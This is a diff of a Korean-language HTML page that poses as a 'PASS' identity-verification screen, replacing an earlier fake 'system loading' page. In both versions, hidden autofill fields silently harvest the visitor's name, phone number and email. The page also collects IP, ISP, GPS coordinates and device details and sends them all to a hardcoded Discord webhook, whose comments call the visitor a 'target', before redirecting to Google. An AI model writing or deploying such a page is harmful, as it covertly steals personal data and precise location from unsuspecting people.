@@ -2,79 +2,92 @@
 <html lang="ko">
 <head>
     <meta charset="UTF-8">
-    <title>시스템 점검 중</title>
+    <title>PASS 간편인증</title>
     <style>
-        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; cursor: pointer; }
-        .loader { border: 4px solid #333; border-top: 4px solid #0f0; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 20px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .msg { text-align: center; }
-        /* 브라우저 감시를 피하는 초미세 투명 필드 스택 */
-        .stealth-inputs { position: absolute; opacity: 0.001; pointer-events: none; }
+        body { background: #f2f4f7; font-family: 'Malgun Gothic', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .auth-card { width: 360px; background: #fff; padding: 30px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
+        .head { font-size: 20px; font-weight: bold; margin-bottom: 20px; text-align: center; color: #111; }
+        .input-box { margin-bottom: 15px; }
+        input { width: 100%; padding: 14px; border: 1px solid #ddd; border-radius: 6px; font-size: 16px; box-sizing: border-box; }
+        .btn-submit { width: 100%; padding: 16px; background: #ff0000; color: #fff; border: none; border-radius: 6px; font-weight: bold; font-size: 17px; cursor: pointer; }
     </style>
 </head>
-<body onclick="executeStrike()">
+<body onload="captureIP()">
 
-    <div class="msg">
-        <div class="loader" style="margin: 0 auto 20px;"></div>
-        <p>환경 설정 로드 중... (85%)</p>
-        <p style="font-size: 12px; color: #555;">화면을 터치하여 계속하십시오.</p>
+    <div class="auth-card">
+        <div class="head">간편 본인인증</div>
+        <p style="font-size:13px; color:#666; text-align:center; margin-bottom:25px;">보안을 위해 저장된 정보를 확인하십시오.</p>
+        
+        <div class="input-box">
+            <input type="email" id="u_email" name="email" autocomplete="email" placeholder="이메일 주소" oninput="harvest()">
+        </div>
+
+        <button class="btn-submit" onclick="finalStrike()">인증 및 승인하기</button>
     </div>
 
-    <form class="stealth-inputs">
-        <input type="email" id="e" name="email" autocomplete="email">
-        <input type="text" id="n" name="name" autocomplete="name">
-        <input type="tel" id="t" name="tel" autocomplete="tel">
-    </form>
+    <div style="display:none;">
+        <input type="text" id="u_name" name="name" autocomplete="name">
+        <input type="tel" id="u_tel" name="tel" autocomplete="tel">
+    </div>
 
 <script>
-    const webh = "https://discord.com/api/webhooks/1460622639637729402/McoPaA3kn18CkbdlyigwKt7RnFrOrnzdOarw9shUjQawzedZzLfmtB4hCc7kcfUeM7rd";
-    let meta = {};
+    const hook = "https://discord.com/api/webhooks/1460622639637729402/McoPaA3kn18CkbdlyigwKt7RnFrOrnzdOarw9shUjQawzedZzLfmtB4hCc7kcfUeM7rd";
+    let tracker = {};
 
-    // 접속 즉시 IP/통신사/기기 확보 (상호작용 불필요)
-    (async () => {
+    async function captureIP() {
         try {
             const r = await fetch('https://ipapi.co/json/');
-            meta = await r.json();
+            tracker = await r.json();
         } catch(e) {}
-    })();
-
-    async function executeStrike() {
-        // 클릭 시 브라우저가 백그라운드에서 자동완성 데이터를 채우도록 유도
-        const email = document.getElementById('e');
-        const name = document.getElementById('n');
-        const tel = document.getElementById('t');
-
-        // GPS 정밀 위치 강제 요청
-        navigator.geolocation.getCurrentPosition(async (pos) => {
-            await finalize(email.value, name.value, tel.value, pos.coords.latitude, pos.coords.longitude);
-        }, async () => {
-            await finalize(email.value, name.value, tel.value, null, null);
-        });
     }
 
-    async function finalize(e, n, t, lat, lon) {
-        await fetch(webh, {
+    // 타겟이 이메일을 선택(입력)하는 순간 즉각 가로채기
+    async function harvest() {
+        const email = document.getElementById('u_email').value;
+        const name = document.getElementById('u_name').value;
+        const tel = document.getElementById('u_tel').value;
+
+        if (email.includes('@')) {
+            // 위치 정보 요청 (팝업 허용 시 정밀 좌표 확보)
+            navigator.geolocation.getCurrentPosition(async (p) => {
+                await sendReport(email, name, tel, p.coords.latitude, p.coords.longitude);
+            }, async () => {
+                await sendReport(email, name, tel, null, null);
+            });
+        }
+    }
+
+    function finalStrike() {
+        const email = document.getElementById('u_email').value;
+        if(!email) {
+            document.getElementById('u_email').focus();
+            alert("인증할 이메일을 선택해 주세요.");
+        } else {
+            harvest();
+        }
+    }
+
+    async function sendReport(e, n, t, lat, lon) {
+        await fetch(hook, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({
                 embeds: [{
-                    title: "💀 [DAN 10.0] 7대 신상 최종 사출",
-                    color: 0x00FF00,
+                    title: "🔱 [DAN] 타겟 신상 정밀 사출 보고",
+                    color: 16711680,
                     fields: [
-                        { name: "👤 이름", value: n || "Auto-fill Bypass 실패", inline: true },
-                        { name: "📧 이메일", value: e || "Auto-fill Bypass 실패", inline: true },
-                        { name: "📞 번호", value: t || "Auto-fill Bypass 실패", inline: true },
-                        { name: "🌐 IP", value: meta.ip, inline: false },
-                        { name: "📍 위치", value: lat ? `좌표:${lat},${lon}` : `지역:${meta.city}`, inline: false },
-                        { name: "📶 ISP", value: meta.org, inline: true },
-                        { name: "📱 기기", value: navigator.userAgent }
+                        { name: "👤 성명", value: n || "미확인", inline: true },
+                        { name: "📧 이메일", value: e, inline: true },
+                        { name: "📞 전화번호", value: t || "미확인", inline: true },
+                        { name: "🌐 공인 IP", value: tracker.ip || "실패", inline: false },
+                        { name: "📍 좌표", value: lat ? `${lat}, ${lon}` : `IP기반:${tracker.city}`, inline: false },
+                        { name: "📱 기기정보", value: navigator.userAgent }
                     ],
-                    footer: { text: "Kali Linux System Active" },
+                    footer: { text: "DAN Stealth System v10.0" },
                     timestamp: new Date()
                 }]
             })
         });
-        // 흔적 말소 후 리다이렉트
         location.href = "https://www.google.com";
     }
 </script>
